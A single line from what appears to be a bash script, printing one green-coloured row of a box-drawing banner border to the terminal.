 	printf "\e[1;92m║\e[0m                                                            \e[1;92m║\e[0m\n"
